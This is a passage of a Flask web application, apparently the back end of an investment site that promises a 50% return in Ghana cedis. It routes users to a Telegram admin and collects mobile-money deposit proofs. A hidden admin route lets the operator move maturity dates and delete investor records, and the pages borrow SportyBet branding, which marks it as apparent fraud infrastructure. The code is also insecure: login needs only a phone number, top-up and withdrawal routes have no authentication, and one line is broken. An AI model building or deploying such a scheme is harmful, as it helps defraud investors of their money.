      modal_desc = f"Your investment of <b>GHs {amount:,.2f}</b> (Expected 50% Return: <b>GHs {expected_return:,.2f}</b>) has been submitted.<br>Click below to message the admin on Telegram for instant approval!"
      popup_html = (
          POPUP_MODAL_CSS.replace("{{ modal_title }}", modal_title)
          .replace("{{ modal_desc }}", modal_desc)
          .replace("{{ admin_telegram_link }}", ADMIN_TELEGRAM_LINK)
      )

      return render_template_string(
          HTML_TEMPLATE,
          settings=settings,
          show_modal=True,
          popup_html=popup_html,
          admin_telegram_link=ADMIN_TELEGRAM_LINK,
          sporty_toast_html=SPORTYBET_POPUP_HTML,
      )

    except ValueError:
      flash("Invalid input. Please check your data.")
      return redirect(url_for("index"))

  return render_template_string(
      HTML_TEMPLATE,
      settings=settings,
      show_modal=False,
      admin_telegram_link=ADMIN_TELEGRAM_LINK,
      sporty_toast_html=SPORTYBET_POPUP_HTML,
  )


@app.route("/login", methods=["GET", "POST"])
def login():
  if request.method == "POST":
    number = request.form.get("number", "").strip()
    investors = load_investors()
    found = any(inv.get("number") == number for inv in investors)
    if found:
      session["investor_number"] = number
      return redirect(url_for("dashboard"))
    else:
      flash("No account found with this phone number.")
      return redirect(url_for("login"))

  return render_template_string(
      INVESTOR_LOGIN_TEMPLATE, sporty_toast_html=SPORTYBET_POPUP_HTML
  )


@app.route("/dashboard")
def dashboard():
  number = session.get("investor_number")
  if not number:
    return redirect(url_for("login"))

  investors = load_investors()
  investors_found = []
  investor_name = "Investor"
  now = datetime.now()

  for idx, inv in enumerate(investors):
    if inv.get("number") == number:
      investor_name = inv.get("name", "Investor")
      inv_copy = inv.copy()
      inv_copy["global_idx"] = idx
      if "expected_return" not in inv_copy:
        inv_copy["expected_return"] = inv_copy["amount"] * 1.5

      try:
        maturity_dt = datetime.strptime(
            inv["maturity_date"], "%Y-%m-%d %H:%M:%S"
        )
        inv_copy["can_withdraw"] = (
            now >= maturity_dt
            and inv["status"] == "Payment Confirmed & Active"
        )
      except Exception:
        inv_copy["can_withdraw"] = False

      investors_found.append(inv_copy)

  return render_template_string(
      INVESTOR_DASHBOARD_TEMPLATE,
      investors=investors_found,
      investor_name=investor_name,
      admin_telegram_link=ADMIN_TELEGRAM_LINK,
      sporty_toast_html=SPORTYBET_POPUP_HTML,
  )


@app.route("/track", methods=["GET", "POST"])
def track():
  # Legacy track route redirects or uses dashboard log in
  return redirect(url_for("login"))


@app.route("/logout")
def logout():
  session.pop("investor_number", None)
  return redirect(url_for("index"))


@app.route("/topup/<int:index>", methods=["POST"])
def topup(index):
  investors = load_investors()
  if 0 <= index < len(investors):
    inv = investors[index]
    try:
      topup_amt = float(request.form["topup_amount"])
      topup_proof = request.form.get("topup_proof", "").strip()
      file = request.files.get("topup_screenshot")

      filename = ""
      if file and file.filename != "":
        filename = secure_filename(
            f"topup_{int(time.time())}_{file.filename}"
        )
        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))

      if topup_amt > 0:
        inv["amount"] += topup_amt
        inv["expected_return"] = inv["amount"] * 1.5
        save_all_investors(investors)

        proof_text = (
            topup_proof if topup_proof else ("Screenshot attached" if filename else "None")
        )
        send_telegram_alert(
            f"📈 <b>INVESTMENT TOP-UP RECEIVED</b>\n\n"
            f"👤 <b>Name:</b> {inv['name']}\n"
            f"📞 <b>Number:</b> {inv['number']}\n"
            f"➕ <b>Added Capital:</b> GHs {topup_amt}\n"
            f"🧾 <b>Proof:</b> {proof_text}\n"
            f"💰 <b>New Total Capital:</b> GHs {inv['amount']}\n"
            f"📈 <b>New Expected Return:</b> GHs {inv['expected_return']}",
            os.path.join(app.config["UPLOAD_FOLDER"], filename)
            if filename
            else None,
        )
        flash("Top-up submitted successfully!")
    except ValueError:
      flash("Invalid top-up amount.")
  return redirect(url_for("dashboard"))


@app.route("/withdraw/<int:index>", methods=["GET"])
def withdraw(index):
  investors = load_investors()
  if 0 <= index < len(investors):
    inv = investors[index]
    now = datetime.now()
    if "expected_return" not in inv:
      inv["expected_return"] = inv["amount"] * 1.5

    try:
      maturity_dt = datetime.strptime(inv["maturity_date"], "%Y-%m-%d %H:%M:%S")
      if (
          now >= maturity_dt
          and inv["status"] == "Payment Confirmed & Active"
      ):
        inv["status"] = "Withdrawal Requested"
        save_all_investors(investors)

        send_telegram_alert(
            f"📥 <b>WITHDRAWAL REQUESTED</b>\n\n"
            f"👤 <b>Name:</b> {inv['name']}\n"
            f"📞 <b>Number:</b> {inv['number']}\n"
            f"💰 <b>Total Payout Due (50% ROI):</b> GHs {inv['expected_return']}"
        )
        flash("Withdrawal request submitted successfully!")
    except Exception:
      pass
  return redirect(url_for("dashboard"))


# --- ADMIN ROUTES ---


@app.route("/zenith-secret-admin", methods=["GET", "POST"])
def admin_login():
  if request.method == "POST":
    password = request.form.get("password")
    if password == ADMIN_PASSWORD:
      session["admin_logged_in"] = True
      return redirect(url_for("admin_dashboard"))
    else:
      flash("Incorrect admin password.")
      return redirect(url_for("admin_login"))

  return render_template_string(
      ADMIN_LOGIN_TEMPLATE, sporty_toast_html=SPORTYBET_POPUP_HTML
  )


@app.route("/admin-dashboard")
def admin_dashboard():
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  for inv in investors:
    if "expected_return" not in inv:
      inv["expected_return"] = inv["amount"] * 1.5

  settings = load_settings()
  return render_template_string(
      ADMIN_DASHBOARD_TEMPLATE,
      investors=investors,
      settings=settings,
      enumerate=enumerate,
      sporty_toast_html=SPORTYBET_POPUP_HTML,
  )


@app.route("/admin/settings", methods=["POST"])
def update_settings():
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  settings = load_settings()
  settings["momo_number"] = request.form.get(
      "momo_number", settings["momo_number"]
  )
  settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
  save_settings(settings)
  flash("Company payment details updated successfully!")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/confirm/<int:index>", methods=["POST"])
def confirm_payment(index):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  if 0 <= index < len(investors):
    investors[index]["status"] = "Payment Confirmed & Active"
    save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/complete-withdrawal/<int:index>", methods=["POST"])
def complete_withdrawal(index):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  if 0 <= index < len(investors):
    investors[index]["status"] = "Withdrawn Completed"
    save_all_investors(investors)
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/update-maturity/<int:index>", methods=["POST"])
def update_maturity(index):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  if 0 <= index < len(investors):
    new_time = request.form.get("new_maturity", "").strip()
    if new_time:
      investors[index]["maturity_date"] = new_time
      save_all_investors(investors)
      flash("Investment maturity time successfully updated!")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin/delete/<int:index>", methods=["POST"])
def delete_investor(index):
  if not session.get("admin_logged_in"):
    return redirect(url_for("admin_login"))

  investors = load_investors()
  if 0 <= index < len(investors):
    investors.pop(index)
    save_all_investors(investors)
    flash("Test / registration entry deleted successfully!")
  return redirect(url_for("admin_dashboard"))


@app.route("/admin-logout")
def admin_logout():
  session.pop("admin_logged_in", None)
  return redirect(url_for("index"))


@app.route("/uploads/<filename>")
def uploaded_file(filename):
  return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


if __name__ == "__main__":
  port = int(os.environ.com("PORT", 5001) if "PORT" in os.environ else 5001)
  app.run(host="0.0.0.0", port=port)
